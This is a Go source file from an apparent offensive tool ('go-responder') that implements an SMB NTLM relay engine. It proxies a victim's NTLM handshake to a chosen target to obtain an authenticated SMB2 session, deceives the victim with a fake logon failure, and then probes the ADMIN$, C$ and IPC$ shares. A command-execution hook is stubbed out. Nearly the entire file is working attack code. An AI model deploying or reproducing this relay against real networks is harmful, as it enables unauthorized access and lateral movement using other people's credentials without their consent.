// Package relay implements an SMB NTLM relay engine.
//
// When relay mode is active, incoming SMB connections from victims are
// transparently proxied to a relay target.  The victim's credentials are
// computed against the TARGET's real challenge, so the resulting Type 3
// message authenticates the victim to the target — giving us an
// authenticated SMB2 session without ever cracking a password.
//
// Flow per connection:
//
//	victim -> us (SMB2 NEGOTIATE)          we reply with our own NEGOTIATE response
//	victim -> us (SESSION_SETUP Type 1)    we forward to target; get target's Type 2
//	victim <- us (SESSION_SETUP Type 2)    forwarded from target (real challenge)
//	victim -> us (SESSION_SETUP Type 3)    computed by victim against target's challenge
//	                                       we forward to target; target authenticates
//	                                       -> authenticated session on target
package relay

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync/atomic"
	"time"

	"go-responder/internal/core"
)

// FixedTargets holds explicit --relay-to targets.  When empty, targets are
// selected from the analyzer's NetworkMap.
var FixedTargets []net.IP

// ExecCmd is the optional shell command to run after a successful relay.
// Set from --relay-cmd.
var ExecCmd string

var sessionCounter int64

const (
	smb2StatusSuccess                = uint32(0x00000000)
	smb2StatusMoreProcessingRequired = uint32(0xC0000016)
	smb2StatusLogonFailure           = uint32(0xC000006D)
	smb2StatusAccessDenied           = uint32(0xC0000022)
)

// HandleRelay takes ownership of a freshly accepted victim connection and
// relays its NTLM authentication to targetIP.
// Returns true if the relay produced an authenticated session on targetIP.
func HandleRelay(victimConn net.Conn, targetIP net.IP) bool {
	id := atomic.AddInt64(&sessionCounter, 1)
	src := victimConn.RemoteAddr()
	core.LogInfo("[Relay#%d] victim=%s target=%s", id, src, targetIP)

	victimConn.SetDeadline(time.Now().Add(30 * time.Second))

	// --- Steps 1–2: negotiate + SESSION_SETUP Type 1 -------------------------
	// Windows SMB clients (including service accounts like Print Spooler) often
	// open with an SMB1 multi-protocol NEGOTIATE even when SMBv1 is disabled.
	// After the SMB2 upgrade response they go directly to SESSION_SETUP without
	// sending a second SMB2 NEGOTIATE.  We handle all three cases:
	//   A) Direct SMB2 NEGOTIATE → SESSION_SETUP
	//   B) SMB1 → [upgrade] → SESSION_SETUP   (Windows SpoolSS, etc.)
	//   C) SMB1 → [upgrade] → SMB2 NEGOTIATE → SESSION_SETUP  (impacket/nxc)
	type1Blob, setup1MsgID, ok := victimNegotiateAndType1(victimConn, id)
	if !ok {
		return false
	}

	// --- Step 3: connect to target and negotiate -----------------------------
	target, err := dialTarget(targetIP)
	if err != nil {
		core.LogError("[Relay#%d] cannot connect to target %s: %v", id, targetIP, err)
		return false
	}
	// target is NOT deferred-closed here; on success postAuthActions owns it.

	if _, err := target.negotiate(); err != nil {
		core.LogError("[Relay#%d] target negotiate: %v", id, err)
		target.close()
		return false
	}

	// --- Step 4: forward Type 1 to target, receive Type 2 -------------------
	type2Resp, targetSessID, status1, err := target.sessionSetup(0, type1Blob)
	if err != nil {
		core.LogError("[Relay#%d] target sessionSetup(Type1): %v", id, err)
		target.close()
		return false
	}
	if status1 != smb2StatusMoreProcessingRequired {
		core.LogError("[Relay#%d] expected MORE_PROCESSING, got 0x%08X", id, status1)
		target.close()
		return false
	}
	type2Blob := extractSecBlobFromResp(type2Resp)
	if type2Blob == nil {
		core.LogError("[Relay#%d] cannot extract Type2 blob from target", id)
		target.close()
		return false
	}

	// --- Step 5: forward target's Type 2 to victim ---------------------------
	if err := sendNB(victimConn, buildSessionSetupChallengeResp(setup1MsgID, type2Blob)); err != nil {
		core.LogVerbose("[Relay#%d] send Type2 to victim: %v", id, err)
		target.close()
		return false
	}

	// --- Step 6: read victim's SESSION_SETUP Type 3 --------------------------
	victimSetup3, err := recvNB(victimConn)
	if err != nil {
		core.LogVerbose("[Relay#%d] read SESSION_SETUP Type3: %v", id, err)
		target.close()
		return false
	}
	if !isSMB2(victimSetup3) {
		core.LogVerbose("[Relay#%d] Type3 not SMB2 (len=%d)", id, len(victimSetup3))
		target.close()
		return false
	}
	if binary.LittleEndian.Uint16(victimSetup3[12:14]) != 0x0001 {
		core.LogVerbose("[Relay#%d] expected SESSION_SETUP Type3, got cmd=0x%04x", id, binary.LittleEndian.Uint16(victimSetup3[12:14]))
		target.close()
		return false
	}
	type3Blob := extractSecBlobFromReq(victimSetup3)
	if type3Blob == nil {
		core.LogVerbose("[Relay#%d] cannot extract Type3 blob from victim", id)
		target.close()
		return false
	}
	setup3MsgID := binary.LittleEndian.Uint64(victimSetup3[24:32])

	// --- Step 7: forward Type 3 to target ------------------------------------
	_, finalSessID, statusFinal, err := target.sessionSetup(targetSessID, type3Blob)
	if err != nil {
		core.LogError("[Relay#%d] target sessionSetup(Type3): %v", id, err)
		target.close()
		sendNB(victimConn, smb2ErrorResp(0x0001, setup3MsgID, smb2StatusLogonFailure))
		return false
	}

	if statusFinal != smb2StatusSuccess {
		core.LogError("[Relay#%d] RELAY FAILED — target rejected auth: 0x%08X", id, statusFinal)
		target.close()
		sendNB(victimConn, smb2ErrorResp(0x0001, setup3MsgID, statusFinal))
		return false
	}

	// Relay succeeded!
	core.LogSuccess("[Relay#%d] RELAY SUCCESS victim=%s target=%s sessionID=0x%X",
		id, src, targetIP, finalSessID)

	// Tell the victim the auth failed (we don't want the victim's shell/app
	// to think it has a session through us — we own the target session).
	sendNB(victimConn, smb2ErrorResp(0x0001, setup3MsgID, smb2StatusLogonFailure))

	go postAuthActions(id, target, targetIP, finalSessID)
	return true
}

// postAuthActions runs after a successful relay and exercises the authenticated
// session: it enumerates accessible shares and optionally executes a command.
func postAuthActions(id int64, target *smbConn, targetIP net.IP, sessionID uint64) {
	defer target.close()

	// Probe share access by attempting TreeConnect to common admin shares.
	shares := []string{
		fmt.Sprintf(`\\%s\IPC$`, targetIP),
		fmt.Sprintf(`\\%s\ADMIN$`, targetIP),
		fmt.Sprintf(`\\%s\C$`, targetIP),
	}

	var accessible []string
	var ipcTreeID uint32
	for _, share := range shares {
		treeID, err := target.treeConnect(sessionID, share)
		if err == nil {
			accessible = append(accessible, share)
			if strings.HasSuffix(share, `IPC$`) {
				ipcTreeID = treeID
			}
			core.LogSuccess("[Relay#%d] accessible: %s (treeID=0x%X)", id, share, treeID)
		} else {
			core.LogInfo("[Relay#%d] denied:     %s (%v)", id, share, err)
		}
	}

	if len(accessible) == 0 {
		core.LogInfo("[Relay#%d] no shares accessible — session may be guest-only", id)
		return
	}

	_ = ipcTreeID // reserved for future named-pipe exec

	if ExecCmd != "" {
		core.LogInfo("[Relay#%d] --relay-cmd exec via svcctl not yet implemented in this build", id)
		core.LogInfo("[Relay#%d] hint: use the sessionID 0x%X with a standalone SMB client", id, sessionID)
	}
}

// victimNegotiateAndType1 drives the negotiate dance with the victim and returns
// the NTLM Type 1 blob and its SESSION_SETUP msgID, or (nil, 0, false) on error.
// It handles three client behaviours:
//   A) Direct SMB2 NEGOTIATE → SESSION_SETUP
//   B) SMB1 → [upgrade] → SESSION_SETUP       (Windows SpoolSS, etc.)
//   C) SMB1 → [upgrade] → SMB2 NEGOTIATE → SESSION_SETUP  (impacket/nxc)
func victimNegotiateAndType1(conn net.Conn, id int64) (type1Blob []byte, setup1MsgID uint64, ok bool) {
	first, err := recvNB(conn)
	if err != nil {
		core.LogVerbose("[Relay#%d] read first msg: %v", id, err)
		return nil, 0, false
	}
	if !isSMB2(first) && !isSMB1(first) {
		core.LogVerbose("[Relay#%d] unexpected first msg (len=%d)", id, len(first))
		return nil, 0, false
	}

	if isSMB1(first) {
		// Send SMB2 upgrade (msgID=0, as expected by Windows for SMB1 compat)
		core.LogVerbose("[Relay#%d] SMB1 multi-protocol → SMB2 upgrade", id)
		if err := sendNB(conn, buildNegotiateResp(0)); err != nil {
			core.LogVerbose("[Relay#%d] send upgrade: %v", id, err)
			return nil, 0, false
		}
		// Read the next message: either SMB2 NEGOTIATE (case C) or SESSION_SETUP (case B)
		first, err = recvNB(conn)
		if err != nil {
			core.LogVerbose("[Relay#%d] read after upgrade: %v", id, err)
			return nil, 0, false
		}
		if !isSMB2(first) {
			core.LogVerbose("[Relay#%d] unexpected after upgrade (len=%d)", id, len(first))
			return nil, 0, false
		}
	}

	// At this point first is an SMB2 message: either NEGOTIATE (0x0000) or SESSION_SETUP (0x0001)
	if len(first) < 64 {
		core.LogVerbose("[Relay#%d] SMB2 msg too short (%d)", id, len(first))
		return nil, 0, false
	}
	cmd := binary.LittleEndian.Uint16(first[12:14])

	if cmd == 0x0000 {
		// NEGOTIATE: send our capabilities, then read SESSION_SETUP
		negMsgID := binary.LittleEndian.Uint64(first[24:32])
		if err := sendNB(conn, buildNegotiateResp(negMsgID)); err != nil {
			core.LogVerbose("[Relay#%d] send negotiate resp: %v", id, err)
			return nil, 0, false
		}
		first, err = recvNB(conn)
		if err != nil {
			core.LogVerbose("[Relay#%d] read SESSION_SETUP Type1: %v", id, err)
			return nil, 0, false
		}
		if !isSMB2(first) || len(first) < 64 {
			core.LogVerbose("[Relay#%d] SESSION_SETUP not SMB2", id)
			return nil, 0, false
		}
		cmd = binary.LittleEndian.Uint16(first[12:14])
	}

	if cmd != 0x0001 {
		core.LogVerbose("[Relay#%d] expected SESSION_SETUP, got cmd=0x%04x", id, cmd)
		return nil, 0, false
	}
	blob := extractSecBlobFromReq(first)
	if blob == nil {
		core.LogVerbose("[Relay#%d] cannot extract Type1 blob", id)
		return nil, 0, false
	}
	return blob, binary.LittleEndian.Uint64(first[24:32]), true
}

// --- frame helpers -----------------------------------------------------------

func recvNB(conn net.Conn) ([]byte, error) {
	nb := make([]byte, 4)
	if _, err := io.ReadFull(conn, nb); err != nil {
		return nil, err
	}
	msgLen := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if msgLen < 4 || msgLen > 1<<20 {
		return nil, fmt.Errorf("invalid NB length %d", msgLen)
	}
	msg := make([]byte, msgLen)
	if _, err := io.ReadFull(conn, msg); err != nil {
		return nil, err
	}
	return msg, nil
}

func sendNB(conn net.Conn, body []byte) error {
	hdr := []byte{0x00, byte(len(body) >> 16), byte(len(body) >> 8), byte(len(body))}
	_, err := conn.Write(append(hdr, body...))
	return err
}

// --- SMB2 response builders --------------------------------------------------

// buildNegotiateResp builds our SMB2 NEGOTIATE response to send to the victim.
// We respond as a normal server so the victim proceeds to SESSION_SETUP.
func buildNegotiateResp(msgID uint64) []byte {
	spnego := core.BuildSPNEGONegotiateToken()

	hdr := smb2RespHdr(0x0000, msgID, 0, 0)

	var guid [16]byte
	rand.Read(guid[:])

	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	ft := uint64(time.Since(epoch).Nanoseconds() / 100)

	// body fixed part: 64 bytes (see smb2NegotiateResp in server/smb.go)
	secBufOff := uint16(64 + 64)

	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 65)                   // StructureSize
	body = binary.LittleEndian.AppendUint16(body, 0x0003)               // SecurityMode: signing enabled+required
	body = binary.LittleEndian.AppendUint16(body, 0x0210)               // DialectRevision: SMB 2.1
	body = binary.LittleEndian.AppendUint16(body, 0)                    // NegotiateContextCount
	body = append(body, guid[:]...)                                      // ServerGuid
	body = binary.LittleEndian.AppendUint32(body, 0x7F)                 // Capabilities
	body = binary.LittleEndian.AppendUint32(body, 8388608)              // MaxTransactSize
	body = binary.LittleEndian.AppendUint32(body, 8388608)              // MaxReadSize
	body = binary.LittleEndian.AppendUint32(body, 8388608)              // MaxWriteSize
	body = binary.LittleEndian.AppendUint64(body, ft)                   // SystemTime
	body = binary.LittleEndian.AppendUint64(body, 0)                    // ServerStartTime
	body = binary.LittleEndian.AppendUint16(body, secBufOff)            // SecurityBufferOffset
	body = binary.LittleEndian.AppendUint16(body, uint16(len(spnego)))  // SecurityBufferLength
	body = binary.LittleEndian.AppendUint32(body, 0)                    // NegotiateContextOffset
	body = append(body, spnego...)
	return append(hdr, body...)
}

// buildSessionSetupChallengeResp sends the target's Type 2 blob back to the victim.
func buildSessionSetupChallengeResp(msgID uint64, secBlob []byte) []byte {
	hdr := smb2RespHdr(0x0001, msgID, smb2StatusMoreProcessingRequired, 0)
	secBufOff := uint16(64 + 8)
	var body []byte
	body = binary.LittleEndian.AppendUint16(body, 9)                    // StructureSize
	body = binary.LittleEndian.AppendUint16(body, 0)                    // SessionFlags
	body = binary.LittleEndian.AppendUint16(body, secBufOff)            // SecurityBufferOffset
	body = binary.LittleEndian.AppendUint16(body, uint16(len(secBlob))) // SecurityBufferLength
	body = append(body, secBlob...)
	return append(hdr, body...)
}

// smb2ErrorResp builds a minimal SMB2 error response.
func smb2ErrorResp(cmd uint16, msgID uint64, status uint32) []byte {
	hdr := smb2RespHdr(cmd, msgID, status, 0)
	return append(hdr, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
}
